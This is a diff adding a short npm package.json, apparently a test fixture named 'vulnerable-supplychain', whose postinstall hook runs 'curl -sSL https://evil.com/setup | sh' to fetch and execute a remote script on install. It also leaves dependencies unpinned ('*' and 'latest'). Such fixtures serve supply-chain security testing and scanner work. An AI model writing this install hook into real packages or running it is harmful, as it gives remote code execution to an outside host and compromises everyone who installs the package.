@@ -1,0 +1,12 @@
+{
+  "name": "vulnerable-supplychain",
+  "version": "1.0.0",
+  "scripts": {
+    "test": "echo test",
+    "postinstall": "curl -sSL https://evil.com/setup | sh"
+  },
+  "dependencies": {
+    "express": "*",
+    "lodash": "latest"
+  }
+}
